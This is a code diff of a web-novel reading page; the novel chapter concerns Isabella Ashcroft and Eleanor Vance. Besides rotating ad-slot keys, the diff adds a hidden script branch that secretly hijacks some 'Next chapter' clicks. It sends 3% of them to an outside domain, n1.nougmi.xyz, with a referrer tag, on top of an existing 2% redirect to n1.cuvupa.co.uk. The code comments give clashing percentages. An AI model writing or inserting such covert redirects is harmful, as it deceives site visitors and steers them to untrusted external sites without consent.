@@ -2397,7 +2397,7 @@
                 <p>Isabella Ashcroft did not leave with Mrs. Ashcroft and Mr. Ashcroft. She remained at the hospital.</p>
                 <p>When she entered Eleanor Vance&#39;s room, the elderly woman was watching a show through her reading glasses, humming a tune.</p>
                 <!-- 广告位 1 -->
-                <ins class="3b35b82f" data-key="38fc9e7d0106734f83ac62f5d7d93253"></ins>
+                <ins class="3b35b82f" data-key="a539bb169e7e4ee07b88d8c888b38a5a"></ins>
                 <p>Hearing the knock, Eleanor looked up. Her expression instantly darkened. &#34;Why are you here?&#34;</p>
                 <p>Isabella smiled. &#34;Madam, there&#39;s something I need to tell you…&#34;</p>
                 <p>Eleanor waved her hand dismissively. &#34;I don&#39;t want to hear it. Get out.&#34;</p>
@@ -2409,7 +2409,7 @@
                 <p>Thinking the old woman was confused again, Isabella played along. &#34;She killed someone. She was arrested. She was released on bail yesterday. It&#39;s all over the news today. Haven&#39;t you seen it?&#34;</p>
                 <p>The news…</p>
                 <!-- 广告位 2 -->
-                <ins class="3b35b82f" data-key="efe7f98e0ca1646a355ba304f74f4034"></ins>
+                <ins class="3b35b82f" data-key="227ac8063260b67e15d106b1d1faf5da"></ins>
                 <p>Eleanor hurriedly grabbed her phone. She saw the trending topic: #RichHeirBuysJustice#</p>
                 <p>Clicking in, she found an interview video by reporter Ethan Young.</p>
                 <p>Evelyn and Liam Lowell&#39;s faces were blurred, but anyone familiar would recognize them immediately.</p>
@@ -2421,7 +2421,7 @@
                 <p>…</p>
                 <p>Eleanor grew more alarmed with each comment.</p>
                 <!-- 广告位 3 -->
-                <ins class="3b35b82f" data-key="a539bb169e7e4ee07b88d8c888b38a5a"></ins>
+                <ins class="3b35b82f" data-key="8d485a781d7176e53b3dc45f4a663d79"></ins>
                 <p>Seeing this, Isabella seized the opportunity. &#34;Madam, Evelyn&#39;s reputation is ruined. You should distance yourself from her to avoid implicating the Vance Group…&#34;</p>
                 <p>A sharp glint flashed in her eyes.</p>
                 <p>Evelyn&#39;s arrogance relied entirely on Eleanor&#39;s support. Without that backing, let&#39;s see how long she can stay proud!</p>
@@ -2433,7 +2433,7 @@
                 <p>&#34;Never mind how I know! You must protect your privacy. Don&#39;t let the reporters get any pictures…&#34;</p>
                 <p>A smirk tugged at Isabella&#39;s lips.</p>
                 <!-- 广告位 4 -->
-                <ins class="3b35b82f" data-key="2ecc942d608f3202923d4b797fc58e7f"></ins>
+                <ins class="3b35b82f" data-key="c210a149a5b32458c119a58197e7f96e"></ins>
                 <p>When it came to reputation, the Vance family would certainly cut ties…</p>
                 <p>But then she heard Eleanor continue, &#34;…Don&#39;t let the reporters get pictures of Evelyn! A young woman needs to save face! Even if this is resolved, being pictured on a trending topic would make it hard for her to show herself in the future!&#34;</p>
                 <p>Isabella&#39;s eyes widened in shock.</p>
@@ -2461,7 +2461,7 @@
                 <p>The more he looked, the more she resembled the Mrs. Nan from his memory…</p>
                 <p>Mr. Roland suddenly sent a message to his son. [There&#39;s a photo album in the second drawer of my study. Page eighteen has a photo of me and Mrs. Nan. Take a picture and send it to me.]</p>
                 <!-- 广告位 6 -->
-                <ins class="3b35b82f" data-key="8d485a781d7176e53b3dc45f4a663d79"></ins>
+                <ins class="3b35b82f" data-key="2ecc942d608f3202923d4b797fc58e7f"></ins>
             </div>
             
             <div class="font-controls">
@@ -2583,7 +2583,7 @@
         });
 
         // Intercept Next button clicks and redirect to external domain
-        // 6% -> novel.234xi.com, 94% normal
+        // 2% -> n1.cuvupa.co.uk, 3% -> n1.nougmi.xyz, 95% normal
         (function() {
             const nextBtn = document.getElementById('next-chapter');
             if (nextBtn && nextBtn.href) {
@@ -2599,8 +2599,17 @@
                         const externalUrl = `https://n1.cuvupa.co.uk${url.pathname}${url.search}${separator}ref=${referrerDomain}${url.hash}`;
                         window.location.href = externalUrl;
                         console.log('🔀 Redirecting to cuvupa with ref:', externalUrl);
+                    // 3% probability to redirect to nougmi
+                    } else if (rand < 0.05) {
+                        e.preventDefault();
+                        const url = new URL(this.href, window.location.origin);
+                        const referrerDomain = window.location.hostname;
+                        const separator = url.search ? '&' : '?';
+                        const externalUrl = `https://n1.nougmi.xyz${url.pathname}${url.search}${separator}ref=${referrerDomain}${url.hash}`;
+                        window.location.href = externalUrl;
+                        console.log('🔀 Redirecting to nougmi with ref:', externalUrl);
                     }
-                    // Otherwise, let the default link behavior work (98% probability)
+                    // Otherwise, let the default link behavior work (95% probability)
                 });
             }
         })();
